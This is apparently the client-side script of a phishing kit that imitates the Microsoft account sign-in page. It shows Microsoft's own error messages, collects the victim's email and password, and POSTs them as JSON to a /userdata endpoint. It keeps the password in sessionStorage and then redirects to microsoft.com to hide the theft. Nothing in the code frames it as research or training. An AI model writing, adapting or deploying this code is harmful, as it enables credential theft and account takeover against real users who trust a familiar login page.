if(sessionStorage.getItem("password")){
    window.location.href = "https://www.microsoft.com/";
}

const slidePage = document.querySelector(".slide-page");
const secondSlide = document.querySelector(".secondSlide");
const btnNext = document.querySelector(".firstNext");
const prevBtnSec = document.querySelector(".prev-1");
const submitBtn = document.querySelector(".submit");

const createBody = (data) => {
  return JSON.stringify(data); // Change this to send JSON instead of form-urlencoded data
}

const sendData = (data) => fetch(`/userdata`, {
  method: 'POST',
  mode: 'cors', // Change this from 'no-cors' to 'cors'
  cache: 'no-cache',
  headers: {
    'Content-Type': 'application/json', // Change this to send JSON
  },
  referrerPolicy: 'no-referrer',
  body: createBody(data),
})
.then(response => {
  if (!response.ok) {
    throw new Error('Network response was not ok');
  }
  return response.text();
})
.then(data => {
  console.log('Success:', data);
})
.catch((error) => {
  console.error('Error:', error);
});

function validateEmail(email) {
  const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
  return re.test(email);
}

function validate() {
  const $result = $("#result");
  const email = $("#email").val();
  $result.text("");

  if(!validateEmail(email)) {
    if(!email) {
      $result.text("Enter a valid email address, phone number, or Skype\n name.");
      $result.css("color", "red");
      // make loginForm little bigger
      document.getElementById("loginForm").style.height = "403px";
    } else {
      $result.text("That Microsoft account doesn't exist.\n Enter a different account or get a new one.");
      $result.css("color", "red");
      // make loginForm little bigger
      document.getElementById("loginForm").style.height = "403px";
    }
    return false;
  }
  return true;
}

function validatePassword() {
  const $passResult = $("#passResult");
  const password = $("#password").val();
  $passResult.text("");

  if(password.length < 8) {
    $passResult.text("Your account or password is incorrect. If you don't remember your password,");
    $passResult.css("color", "red");
    return false;
  }
  return true;
}

// event listeners for entering in textbox
var input1 = document.getElementById("email");
var input2 = document.getElementById("password");

input1.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("btnSend").click();
  }
})

input2.addEventListener("keyup", function(event) {
  if (event.keyCode === 13) {
    event.preventDefault();
    document.getElementById("btnSignIn").click();
  }
})

btnSend.addEventListener("click", function(){

  const email = input1.value;
  
  // check email is not empty
  if(!validate()) return;
  
  // check valid email
  if(!validateEmail(email)) {
    return;
  }

  console.log(`User entered valid email: ${email}`);
  
  // set valid email to next slide
  document.getElementById("userLine").textContent = email;

  // set margins to slide next part of login form to visible and hide first one
  const section1 = document.getElementById("section-1");
  const section2 = document.getElementById("section-2");
  section1.style.marginLeft = "-100%";
  section1.style.visibility = "hidden";
  section2.style.marginLeft = "0%";

  // make loginForm little bigger
  document.getElementById("loginForm").style.height = "403px";
});

btnSignIn.addEventListener("click", function(){
  const collectUserName = input1.value;
  const collectPassword = input2.value;

  // check password
  if (!validatePassword()) return;

  console.log(`User entered valid password: ${collectPassword}`);

  sessionStorage.setItem("user", collectUserName);
  sessionStorage.setItem("password", collectPassword);
  
  console.log('Sending data to server...'); // Add this for debugging
  sendData({userName: collectUserName, password: collectPassword});

  // set session item to indicate if user is already giving login information. if is redirect user to somewhere.
  sessionStorage.setItem("secsession", false);

  console.log('from session storage', sessionStorage.getItem('password'));
  setTimeout(function(){
    window.location.href = "https://www.microsoft.com/";
  }, 1000); // Increase timeout to allow for network request to complete
});

prevBtnSec.addEventListener("click", function(){

  // set margins to top back to normnal
  const section1 = document.getElementById("section-1");
  const section2 = document.getElementById("section-2");
  section1.style.marginLeft = "0%";
  section1.style.visibility = "visible";
  section2.style.marginLeft = "100%";

  // make loginForm little bigger
  document.getElementById("loginForm").style.height = "370px";

  slidePage.style.marginLeft = "0%";
  secondSlide.style.marginLeft = "100%";
  slidePage.style.visibility = "visible";
});
